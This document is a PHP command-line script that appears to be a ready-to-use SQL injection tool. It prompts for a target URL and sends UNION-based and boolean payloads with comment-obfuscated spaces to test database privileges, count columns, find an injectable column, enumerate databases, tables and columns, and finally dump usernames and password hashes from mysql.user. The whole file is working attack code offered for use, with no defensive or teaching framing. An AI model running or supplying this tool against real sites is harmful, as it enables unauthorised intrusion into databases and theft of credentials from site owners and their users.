<?php
error_reporting(0);

function clean($html) {
    return preg_replace('/<.*?>/', '', $html);
}

function get($url) {
    return file_get_contents($url);
}

echo "[+] Target URL: ";
$url = trim(fgets(STDIN));

if (!$url) die("[-] No URL provided\n");

$normal = clean(get($url));

echo "[*] Checking file_priv / is_grantable...\n";
$payloads = [
    "'/**/and/**/(select/**/substring(file_priv,1,1)/**/from/**/mysql.user/**/where/**/user=substring(user(),1,length(user))/**/limit/**/0,1)='Y'--+-",
    "'/**/and/**/(select/**/substring(is_grantable,1,1)/**/from/**/information_schema.user_privileges/**/where/**/regexp_replace(grantee,''','')=user())='Y'--+-"
];

foreach ($payloads as $payload) {
    $check = clean(get($url.$payload));
    if ($check === $normal) {
        echo "[+] file_priv or is_grantable: YES\n";
        break;
    }
}

// ---------- COLUMN COUNT ----------
echo "[*] Finding column count...\n";
for ($i = 1; $i <= 20; $i++) {
    $resp = clean(get($url."' order by ".$i."--+-"));
    echo "[*] Trying ORDER BY $i ... ";
    if ($resp === $normal) {
        echo "OK\n";
    } else {
        echo "FAILED\n";
        $cols = $i - 1;
        echo "[+] Column count is $cols\n";
        break;
    }
}

// ---------- INJECTABLE COLUMN ----------
echo "[*] Detecting injectable column...\n";
$teststr = 'trhacknon_inject';
$columns = array_fill(0, $cols, 'null');
$index = 0;
for ($i = 0; $i < $cols; $i++) {
    $columns[$i] = "'$teststr'";
    $payload = "' union select ".implode(',', $columns)."--+-";
    $response = get($url.$payload);
    if (strpos($response, $teststr) !== false) {
        echo "[+] Injectable column: ".($i+1)."\n";
        $index = $i;
        break;
    }
    $columns[$i] = 'null';
}

// ---------- HOST / USER ----------
echo "[*] Extracting user / host...\n";
$cols_payload = array_fill(0, $cols, 'null');
$cols_payload[$index] = "concat(user(),' - ',host)";
$dump = "' union select ".implode(',', $cols_payload)." from mysql.user limit 0,1--+-";
$resp = clean(get($url.$dump));
echo "[+] User / Host: $resp\n";

// ---------- DATABASES ----------
echo "[*] Extracting databases...\n";
for ($i = 0; $i < 5; $i++) {
    $cols_payload[$index] = "schema_name";
    $dump = "' union select ".implode(',', $cols_payload)." from information_schema.schemata limit $i,1--+-";
    $resp = clean(get($url.$dump));
    if (!$resp) break;
    echo "[DB] $resp\n";
}

// ---------- TABLES ----------
echo "[*] Extracting tables from 'mysql'...\n";
for ($i = 0; $i < 5; $i++) {
    $cols_payload[$index] = "table_name";
    $dump = "' union select ".implode(',', $cols_payload)." from information_schema.tables where table_schema='mysql' limit $i,1--+-";
    $resp = clean(get($url.$dump));
    if (!$resp) break;
    echo "[TABLE] $resp\n";
}

// ---------- COLUMNS ----------
echo "[*] Extracting columns from 'mysql.user'...\n";
for ($i = 0; $i < 10; $i++) {
    $cols_payload[$index] = "column_name";
    $dump = "' union select ".implode(',', $cols_payload)." from information_schema.columns where table_name='user' and table_schema='mysql' limit $i,1--+-";
    $resp = clean(get($url.$dump));
    if (!$resp) break;
    echo "[COLUMN] $resp\n";
}

// ---------- DUMP VALUES ----------
echo "[*] Dumping data from 'mysql.user'...\n";
for ($i = 0; $i < 5; $i++) {
    $cols_payload[$index] = "concat(user,0x3a,password)";
    $dump = "' union select ".implode(',', $cols_payload)." from mysql.user limit $i,1--+-";
    $resp = clean(get($url.$dump));
    if (!$resp) break;
    echo "[DUMP] $resp\n";
}

echo "\n[✓] Finished.\n";
?>
